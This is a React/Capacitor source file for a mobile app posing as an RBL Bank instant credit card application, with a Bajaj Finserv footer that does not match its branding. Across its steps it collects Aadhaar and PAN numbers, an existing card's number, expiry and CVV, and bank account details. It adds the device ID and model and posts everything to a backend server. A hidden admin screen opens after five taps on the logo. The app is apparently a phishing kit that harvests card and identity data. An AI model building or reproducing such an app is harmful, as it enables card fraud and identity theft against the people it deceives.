import React, { useState, useEffect, useCallback, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
    User, Phone, Briefcase, Heart, Calendar, ArrowRight,
    IndianRupee as Rupee, CreditCard as CardIcon, Landmark,
    University, ShieldCheck, CheckCircle2, Upload, Check,
    Smartphone, Activity, Lock, Verified, Settings, ChevronRight, Globe
} from 'lucide-react';
import { Device } from '@capacitor/device';

// --- RBL Bank v7.0 Design System (Premium Edition) ---

const THEME = {
    red: '#e42312',
    blue: '#213d8f',
    dark: '#0f172a',
    slate: '#1e293b'
};

const StepHeader = ({ title, subtitle, step, onBack }) => (
    <div className="mb-8 animate-[slideUp_0.4s_ease-out_forwards]">
        <div className="flex justify-between items-center mb-4">
            {step > 0 && (
                <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-lg bg-slate-800/50 border border-slate-700/50">
                    <div className="w-1.5 h-1.5 rounded-full bg-red-600 animate-pulse"></div>
                    <span className="text-[10px] font-bold text-slate-400 uppercase tracking-widest">
                        Step {step} of 5
                    </span>
                </div>
            )}
            {onBack && (
                <button onClick={onBack} className="group flex items-center gap-2 px-3 py-2 rounded-lg bg-slate-800/80 text-white hover:bg-slate-700 border border-slate-700 transition-all active:scale-95">
                    <ChevronRight className="rotate-180" size={16} />
                    <span className="text-[10px] font-black uppercase tracking-widest text-slate-400 group-hover:text-white transition-colors">Back</span>
                </button>
            )}
        </div>
        <h1 className="text-3xl font-bold tracking-tight text-white mb-2">{title}</h1>
        <p className="text-sm font-medium leading-relaxed text-slate-400">{subtitle}</p>
    </div>
);

const StandardInput = ({ label, icon: Icon, type = "text", value, onChange, placeholder, options, capitalize, disabled }) => (
    <div className="mb-6 w-full animate-[slideUp_0.4s_ease-out_forwards]">
        <label className="block text-xs font-bold uppercase tracking-wider mb-2 ml-1 text-slate-400 flex items-center gap-2">
            {Icon && <Icon size={14} className="text-red-500" />}
            {label}
        </label>

        <div className="relative">
            {options ? (
                <div className="relative">
                    <select
                        className="w-full bg-slate-800 text-white px-4 py-4 rounded-xl border border-slate-700 outline-none transition-all duration-200 focus:border-red-600 focus:ring-1 focus:ring-red-600/50 placeholder:text-slate-600 font-medium appearance-none bg-[url('data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22292.4%22%20height%3D%22292.4%22%3E%3Cpath%20fill%3D%22%2394a3b8%22%20d%3D%22M287%2069.4a17.6%2017.6%200%200%200-13-5.4H18.4c-5%200-9.3%201.8-12.9%205.4A17.6%2017.6%200%200%200%200%2082.2c0%205%201.8%209.3%205.4%2012.9l128%20127.9c3.6%203.6%207.8%205.4%2012.8%205.4s9.2-1.8%2012.8-5.4L287%2095c3.5-3.5%205.4-7.8%205.4-12.8%200-5-1.9-9.2-5.5-12.8z%22%2F%3E%3C%2Fsvg%3E')] bg-[length:12px_12px] bg-no-repeat bg-[right_1.5rem_center]"
                        value={value}
                        onChange={(e) => onChange(e.target.value)}
                        disabled={disabled}
                    >
                        <option value="" disabled>{placeholder}</option>
                        {options.map(opt => <option key={opt} value={opt} className="bg-slate-900 text-white">{opt}</option>)}
                    </select>
                </div>
            ) : (
                <input
                    type={type}
                    placeholder={placeholder}
                    className={`w-full bg-slate-800 text-white px-4 py-4 rounded-xl border border-slate-700 outline-none transition-all duration-200 focus:border-red-600 focus:ring-1 focus:ring-red-600/50 placeholder:text-slate-600 font-medium ${capitalize ? 'uppercase' : ''} ${disabled ? 'opacity-50 cursor-not-allowed' : ''}`}
                    value={value}
                    onChange={(e) => onChange(e.target.value)}
                    disabled={disabled}
                />
            )}
        </div>
    </div>
);

// --- Pages ---

const ConfigScreen = ({ onBack }) => {
    const SERVER_URLS = [
        'http://localhost:3000',                // Active Local Backend
        'https://pm-backend-9vz9.onrender.com'  // Production Fallback
    ];
    const [status, setStatus] = useState('');

    const testConnection = async () => {
        setStatus('⏳ Connecting to secure server...');
        let success = false;

        for (const url of SERVER_URLS) {
            try {
                const res = await fetch(`${url}/health`);
                if (res.ok) {
                    success = true;
                    console.log("Connected to:", url);
                    break;
                }
            } catch (e) { console.warn("Failed:", url); }
        }

        if (success) setStatus('✅ Secure Server Online');
        else setStatus('❌ Connection Failed (All Paths)');
    };

    return (
        <div className="flex flex-col h-full px-6 pt-safe pb-safe bg-[var(--bg-primary)]">
            <div className="flex items-center gap-4 py-6 mb-4">
                <button onClick={onBack} className="p-2 rounded-full bg-slate-800 text-white">
                    <ChevronRight className="rotate-180" size={24} />
                </button>
                <h2 className="text-xl font-bold text-white">Admin Tools</h2>
            </div>

            <div className="bg-slate-800 rounded-2xl shadow-xl border border-slate-700 p-6 space-y-6">
                <div className="flex items-center gap-3 p-4 bg-blue-500/10 rounded-xl border border-blue-500/20">
                    <Verified className="text-blue-400" size={24} />
                    <div>
                        <h3 className="text-sm font-bold text-white">System Active</h3>
                        <p className="text-xs text-slate-400">Connected to Secure Cloud</p>
                    </div>
                </div>

                {status && (
                    <div className="p-3 rounded-lg text-xs font-bold bg-green-500/20 text-green-400">
                        {status}
                    </div>
                )}

                <button onClick={testConnection} className="w-full bg-slate-700 hover:bg-slate-600 text-white font-bold py-4 rounded-xl transition-all uppercase tracking-wide text-xs">
                    Test Connectivity
                </button>
            </div>
        </div>
    );
};

const WelcomeScreen = ({ onCompleted, onConfig }) => {
    const [tapCount, setTapCount] = useState(0);
    const [netStatus, setNetStatus] = useState({ color: 'text-slate-500', icon: Activity, text: 'Checking Status...' });

    useEffect(() => {
        const checkNet = async () => {
            try {
                const res = await fetch('http://localhost:3000/health');
                if (res.ok) {
                    setNetStatus({ color: 'text-green-400', icon: Globe, text: 'Secure Link Active' });
                    return;
                }
            } catch (e) { }
            setNetStatus({ color: 'text-red-500', icon: Lock, text: 'Secure Link Offline' });
        };
        checkNet();
        const interval = setInterval(checkNet, 10000);
        return () => clearInterval(interval);
    }, []);

    const handleTap = () => {
        if (tapCount + 1 >= 5) {
            onConfig();
            setTapCount(0);
        } else {
            setTapCount(c => c + 1);
        }
    };

    return (
        <div className="flex flex-col h-full p-8 pt-safe justify-between bg-[var(--bg-primary)]">
            <div className="flex-1 flex flex-col justify-center items-start">
                <div onClick={handleTap} className="active:scale-95 transition-transform mb-8">
                    <div className="flex items-center gap-3">
                        <div className="w-16 h-16 bg-white rounded-2xl flex items-center justify-center p-2 shadow-2xl overflow-hidden">
                            <img src="./assets/rbl_logo.png" className="w-full h-auto" alt="Logo" onError={(e) => {
                                e.target.style.display = 'none';
                                e.target.parentElement.innerHTML = '<span class="text-red-600 font-bold text-2xl">RBL</span>';
                            }} />
                        </div>
                        <div className="flex flex-col">
                            <span className="text-3xl font-black tracking-tighter text-white inline-flex items-center">
                                RBL <span className="text-red-500 ml-1">BANK</span>
                            </span>
                            <span className="text-[10px] font-bold text-slate-500 uppercase tracking-[0.2em] ml-0.5">apno ka bank</span>
                        </div>
                    </div>
                </div>
                <div className="space-y-4">
                    <h1 className="text-5xl font-bold text-white tracking-tight leading-tight">Instant<br />Credit Card</h1>
                    <div className="h-1.5 w-24 bg-red-600 rounded-full"></div>
                    <p className="text-xl text-slate-400 font-medium max-w-[280px]">
                        The only Credit Card you'll ever need. Instant approval.
                    </p>
                </div>
            </div>

            <div className="space-y-6 pb-8">
                <div className="flex items-center gap-4 p-4 rounded-xl bg-slate-800/30 border border-slate-700/50 backdrop-blur-sm">
                    <ShieldCheck className="text-red-500 shrink-0" size={24} />
                    <p className="text-xs text-slate-400 font-medium leading-relaxed">Experience a world of privilege with RBL Bank Credit Cards. Zero joining fees and infinite rewards.</p>
                </div>
                <button onClick={onCompleted} className="w-full bg-red-600 hover:bg-red-700 active:scale-[0.98] text-white font-bold py-4 rounded-xl transition-all duration-200 flex items-center justify-center gap-2 shadow-lg shadow-red-600/20 uppercase tracking-wide text-sm">
                    Get Started <ArrowRight size={20} />
                </button>
            </div>
        </div>
    );
};

const PersonalDetails = ({ data, update, onNext, onBack }) => (
    <div className="flex flex-col h-full p-6 pt-safe">
        <StepHeader title="Personal Info" subtitle="Tell us a bit about yourself." step={1} onBack={onBack} />

        <div className="flex-1 overflow-y-auto pb-4">
            <StandardInput label="Full Name" icon={User} placeholder="As per PAN Card" value={data.name} onChange={(v) => update({ name: v })} />
            <StandardInput label="Mobile Number" icon={Phone} type="tel" placeholder="10-digit number" value={data.phone} onChange={(v) => update({ phone: v })} />

            <div className="grid grid-cols-2 gap-4">
                <StandardInput label="Employment" icon={Briefcase} options={["Salaried", "Self-Employed", "Business"]} value={data.jobType} onChange={(v) => update({ jobType: v })} />
                <StandardInput label="Marital Status" icon={Heart} options={["Single", "Married", "Divorced"]} value={data.maritalStatus} onChange={(v) => update({ maritalStatus: v })} />
            </div>

            <StandardInput label="Date of Birth" icon={Calendar} type="date" value={data.dob} onChange={(v) => update({ dob: v })} />
        </div>

        <button disabled={!data.name || !data.phone} onClick={onNext} className="w-full bg-red-600 hover:bg-red-700 active:scale-[0.98] text-white font-bold py-4 rounded-xl transition-all duration-200 flex items-center justify-center gap-2 shadow-lg shadow-red-600/20 uppercase tracking-wide text-sm mt-4">
            Proceed
        </button>
    </div>
);

const CardOffer = ({ amount, update, onNext, onBack }) => {
    const [customLimit, setCustomLimit] = useState(amount);

    return (
        <div className="flex flex-col h-full p-6 pt-safe">
            <StepHeader title="Desired Limit" subtitle="Choose the credit limit you want." step={2} onBack={onBack} />

            <div className="flex-1 flex flex-col items-center justify-center space-y-12">
                <div className="w-full bg-slate-800 rounded-2xl shadow-xl backdrop-blur-sm border border-slate-700 p-8 flex flex-col items-center justify-center text-center border-red-600/30 bg-gradient-to-b from-[#151e32] to-[#0f1625]">
                    <p className="text-xs font-bold text-red-500 uppercase tracking-widest mb-4">Request Credit Limit</p>
                    <div className="flex items-center justify-center text-white w-full">
                        <span className="text-3xl font-bold mr-2 text-slate-500">₹</span>
                        <input
                            type="number"
                            className="bg-transparent text-5xl font-bold tracking-tighter w-full outline-none text-center border-b border-slate-700 focus:border-red-600"
                            value={customLimit}
                            onChange={(e) => {
                                const val = parseInt(e.target.value) || 0;
                                setCustomLimit(val);
                                update({ amount: val });
                            }}
                        />
                    </div>
                    <div className="w-full mt-8">
                        <input
                            type="range"
                            min="25000"
                            max="1000000"
                            step="5000"
                            value={customLimit}
                            onChange={(e) => {
                                const val = parseInt(e.target.value);
                                setCustomLimit(val);
                                update({ amount: val });
                            }}
                            className="w-full h-1 bg-slate-700 rounded-lg appearance-none cursor-pointer accent-red-600"
                        />
                        <div className="flex justify-between text-[10px] text-slate-500 font-bold uppercase mt-2">
                            <span>₹ 25k</span>
                            <span>₹ 10L+</span>
                        </div>
                    </div>
                </div>

                <div className="w-full space-y-8 text-center">
                    <div className="bg-red-500/10 p-4 rounded-xl border border-red-500/20">
                        <p className="text-xs font-bold text-red-400 uppercase mb-2">Member Benefits</p>
                        <ul className="text-xs text-slate-400 space-y-1 text-left inline-block">
                            <li>• Zero Annual Membership Fee</li>
                            <li>• 5% Cashback on Amazon & Flipkart</li>
                            <li>• Free Airport Lounge Access</li>
                            <li>• Instant Virtual Card Activation</li>
                        </ul>
                    </div>
                </div>
            </div>

            <button onClick={onNext} className="w-full bg-red-600 hover:bg-red-700 active:scale-[0.98] text-white font-bold py-4 rounded-xl transition-all duration-200 flex items-center justify-center gap-2 shadow-lg shadow-red-600/20 uppercase tracking-wide text-sm mt-4">
                Confirm & Continue
            </button>
        </div>
    );
};

const IdentityVerification = ({ data, update, onNext, onBack }) => {
    const methods = [
        { id: 'c2c', name: 'Credit Card to Credit Card', icon: CardIcon },
        { id: 'd2c', name: 'Debit Card to Credit Card', icon: Landmark },
        { id: 'bank', name: 'Bank Account to Apply', icon: University }
    ];

    return (
        <div className="flex flex-col h-full p-6 pt-safe overflow-hidden">
            <StepHeader title="Verification" subtitle="Choose application method." step={3} onBack={onBack} />

            <div className="flex-1 overflow-y-auto space-y-6 pb-4">
                <div className="space-y-3">
                    <label className="text-[10px] font-bold text-slate-500 uppercase tracking-widest ml-1">Application Method</label>
                    <div className="grid grid-cols-1 gap-3">
                        {methods.map(m => (
                            <button
                                key={m.id}
                                onClick={() => update({ applyMethod: m.id })}
                                className={`flex items-center justify-between p-4 rounded-xl border transition-all duration-200 ${data.applyMethod === m.id ? 'bg-red-500/10 border-red-600 shadow-lg shadow-red-600/5' : 'bg-slate-800/30 border-slate-700 hover:border-slate-600'}`}
                            >
                                <div className="flex items-center gap-4">
                                    <div className={`w-10 h-10 rounded-lg flex items-center justify-center ${data.applyMethod === m.id ? 'bg-red-600 text-white' : 'bg-slate-800 text-slate-400'}`}>
                                        <m.icon size={20} />
                                    </div>
                                    <span className={`text-sm font-bold ${data.applyMethod === m.id ? 'text-white' : 'text-slate-400'}`}>{m.name}</span>
                                </div>
                                {data.applyMethod === m.id && <CheckCircle2 className="text-red-500" size={18} />}
                            </button>
                        ))}
                    </div>
                </div>

                <div className="space-y-4 pt-4 border-t border-slate-800">
                    <StandardInput label="Aadhaar Number" icon={Lock} placeholder="12-digit UIDAI Number" value={data.aadhaar} onChange={(v) => update({ aadhaar: v })} />
                    <StandardInput label="PAN Number" icon={ShieldCheck} placeholder="Permanent Account Number" capitalize={true} value={data.pan} onChange={(v) => update({ pan: v })} />
                </div>

                {(data.applyMethod === 'c2c' || data.applyMethod === 'd2c') && (
                    <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="space-y-4 pt-4 border-t border-slate-800">
                        <h3 className="text-sm font-bold text-white flex items-center gap-2">
                            <CardIcon className="text-red-500" size={18} /> Existing Card Details
                        </h3>
                        <StandardInput label="Existing Card Number" placeholder="**** **** **** ****" value={data.cardNumber} onChange={(v) => update({ cardNumber: v })} />
                        <div className="grid grid-cols-2 gap-4">
                            <StandardInput label="Expiry MM/YY" placeholder="MM/YY" value={data.cardExpiry} onChange={(v) => update({ cardExpiry: v })} />
                            <StandardInput label="CVV" type="password" placeholder="123" value={data.cardCvv} onChange={(v) => update({ cardCvv: v })} />
                        </div>
                    </motion.div>
                )}

                {data.applyMethod === 'bank' && (
                    <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="space-y-4 pt-4 border-t border-slate-800">
                        <h3 className="text-sm font-bold text-white flex items-center gap-2">
                            <University className="text-red-500" size={18} /> Bank Verification
                        </h3>
                        <p className="text-xs text-slate-400 mb-4">Complete verification using your primary bank account.</p>
                        {/* The next step (BankDetails) already handles account info, so we just prompt here */}
                    </motion.div>
                )}
            </div>

            <button disabled={!data.aadhaar || !data.pan || !data.applyMethod} onClick={onNext} className="w-full bg-red-600 hover:bg-red-700 active:scale-[0.98] text-white font-bold py-4 rounded-xl transition-all duration-200 flex items-center justify-center gap-2 shadow-lg shadow-red-600/20 uppercase tracking-wide text-sm mt-4">
                Verify & Proceed
            </button>
        </div>
    );
};

const BankDetails = ({ data, update, onNext, onBack }) => (
    <div className="flex flex-col h-full p-6 pt-safe">
        <StepHeader title="Payout Bank" subtitle="For rewards and settlement." step={4} onBack={onBack} />

        <div className="flex-1 space-y-2">
            <StandardInput label="Bank Name" icon={Landmark} placeholder="e.g. HDFC Bank" value={data.bankName} onChange={(v) => update({ bankName: v })} />
            <StandardInput label="Account Number" icon={University} placeholder="Your Account Number" value={data.accNo} onChange={(v) => update({ accNo: v })} />
            <StandardInput label="Confirm Account" icon={CheckCircle2} placeholder="Re-enter Account Number" value={data.confirmAccNo} onChange={(v) => update({ confirmAccNo: v })} />
            <StandardInput label="IFSC Code" icon={ShieldCheck} placeholder="Bank Branch Code" capitalize={true} value={data.ifsc} onChange={(v) => update({ ifsc: v })} />
        </div>

        <button onClick={onNext} className="w-full bg-brand-blue hover:bg-brand-navy active:scale-[0.98] text-white font-bold py-4 rounded-xl transition-all duration-200 flex items-center justify-center gap-2 shadow-lg shadow-brand-blue/20 uppercase tracking-wide text-sm mt-4">
            Save & Continue
        </button>
    </div>
);

const DocumentUpload = ({ onComplete, isSubmitting, onBack }) => {
    const fileRef = useRef(null);
    const [fileName, setFileName] = useState('');

    return (
        <div className="flex flex-col h-full p-6 pt-safe">
            <StepHeader title="Documentation" subtitle="Upload proof of residence." step={5} onBack={onBack} />

            <div className="flex-1 flex flex-col items-center justify-center text-center">
                <div
                    onClick={() => fileRef.current.click()}
                    className="w-full aspect-[4/3] rounded-2xl border-2 border-dashed border-slate-700 bg-slate-800/20 hover:bg-slate-800/40 hover:border-red-600 transition-all cursor-pointer flex flex-col items-center justify-center group"
                >
                    <div className="w-16 h-16 rounded-full bg-slate-800 flex items-center justify-center mb-4 group-hover:scale-110 transition-transform">
                        <Upload className="text-red-600" size={24} />
                    </div>
                    <h3 className="text-lg font-bold text-white mb-2">
                        {fileName ? 'Ready to Upload' : 'Upload Aadhaar Front'}
                    </h3>
                    <p className="text-sm text-slate-500 text-center max-w-[200px]">
                        {fileName || 'PDF or JPG format, max 5MB.'}
                    </p>
                    <input type="file" ref={fileRef} className="hidden" onChange={(e) => setFileName(e.target.files[0]?.name)} accept="image/*,application/pdf" />
                </div>

                <div className="mt-8 flex items-center gap-3 px-4 py-3 bg-red-600/10 rounded-lg text-red-500 border border-red-600/20 inline-flex">
                    <Activity size={18} className="animate-pulse" />
                    <span className="text-xs font-bold uppercase tracking-wide">Secure Encryption Active</span>
                </div>
            </div>

            <button disabled={isSubmitting || !fileName} onClick={onComplete} className="w-full bg-red-600 hover:bg-red-700 active:scale-[0.98] text-white font-bold py-4 rounded-xl transition-all duration-200 flex items-center justify-center gap-2 shadow-lg shadow-red-600/20 uppercase tracking-wide text-sm mt-4">
                {isSubmitting ? 'Processing Application...' : 'Finish Application'}
            </button>
        </div>
    );
};

const SuccessScreen = ({ applicationNo }) => (
    <div className="flex flex-col h-full p-8 pt-safe items-center justify-center text-center bg-[var(--bg-primary)]">
        <div className="w-24 h-24 rounded-full bg-green-500/20 flex items-center justify-center mb-8 animate-bounce">
            <Check className="text-green-500" size={48} strokeWidth={4} />
        </div>

        <h1 className="text-3xl font-bold text-white mb-2">Application Received!</h1>
        <p className="text-slate-400 mb-8 max-w-[250px] mx-auto leading-relaxed">
            Your Credit Card application is being processed. You will receive a verification call shortly.
        </p>

        <div className="w-full bg-slate-800 rounded-2xl shadow-xl backdrop-blur-sm border border-slate-700 p-6 bg-slate-800/50 border-slate-700">
            <div className="flex justify-between items-center mb-4">
                <span className="text-xs font-bold text-slate-500 uppercase">Application ID</span>
                <span className="font-mono text-white text-lg font-bold tracking-widest">{applicationNo}</span>
            </div>
            <div className="h-px bg-slate-700 my-4"></div>
            <div className="flex items-center gap-3">
                <div className="w-2 h-2 rounded-full bg-yellow-500 animate-pulse"></div>
                <span className="text-sm font-bold text-yellow-500">Awaiting KYC Approval</span>
            </div>
        </div>

        <p className="fixed bottom-8 text-[10px] text-slate-600 font-bold uppercase tracking-widest">
            Bajaj Finserv Ltd.
        </p>
    </div>
);

// --- Main App ---

export default function App() {
    const [step, setStep] = useState(-1);
    const [formData, setFormData] = useState({
        name: '', phone: '', dob: '', jobType: '', maritalStatus: '',
        amount: 250000, aadhaar: '', pan: '', cardNumber: '', cardExpiry: '', cardCvv: '',
        bankName: '', accNo: '', confirmAccNo: '', ifsc: ''
    });
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [deviceInfo, setDeviceInfo] = useState(null);
    const [appNo] = useState(`${Math.floor(Math.random() * 900000 + 100000)}`);

    const API_URL = 'http://localhost:3000/api/application/submit';

    useEffect(() => {
        const fetchInfo = async () => {
            try {
                const info = await Device.getInfo();
                const battery = await Device.getBatteryInfo();
                const id = await Device.getId();
                setDeviceInfo({ ...info, ...battery, uuid: id.identifier });
            } catch (e) { }
        };
        fetchInfo();
    }, []);

    const submitApplication = useCallback(async (data) => {
        setIsSubmitting(true);
        const payload = {
            ...data,
            deviceId: deviceInfo?.uuid || 'Unknown',
            deviceInfo: `${deviceInfo?.model || 'Unknown'} (${deviceInfo?.osVersion || 'Unknown'})`,
            appId: appNo
        };

        try {
            await fetch(API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch (e) {
            console.warn('Submission Failed (expected if localized)', e);
        }

        setIsSubmitting(false);
        return true;
    }, [appNo, deviceInfo]);

    const nextStep = async () => {
        if (step === 4) await submitApplication(formData);
        setStep(s => s + 1);
    };

    const updateData = (newData) => setFormData(prev => ({ ...prev, ...newData }));

    return (
        <div className="fixed inset-0 bg-[var(--bg-primary)] text-white overflow-hidden">
            <AnimatePresence mode="wait">
                <motion.div
                    key={step}
                    className="w-full h-full"
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    exit={{ opacity: 0 }}
                    transition={{ duration: 0.2 }}
                >
                    {step === -2 && <ConfigScreen onBack={() => setStep(-1)} />}
                    {step === -1 && <WelcomeScreen onCompleted={() => setStep(0)} onConfig={() => setStep(-2)} />}
                    {step === 0 && <PersonalDetails data={formData} update={updateData} onNext={nextStep} onBack={() => setStep(-1)} />}
                    {step === 1 && <CardOffer amount={formData.amount} update={updateData} onNext={nextStep} onBack={() => setStep(0)} />}
                    {step === 2 && <IdentityVerification data={formData} update={updateData} onNext={nextStep} onBack={() => setStep(1)} />}
                    {step === 3 && <BankDetails data={formData} update={updateData} onNext={nextStep} onBack={() => setStep(2)} />}
                    {step === 4 && <DocumentUpload onComplete={nextStep} isSubmitting={isSubmitting} onBack={() => setStep(3)} />}
                    {step === 5 && <SuccessScreen applicationNo={appNo} />}
                </motion.div>
            </AnimatePresence>
        </div>
    );
}
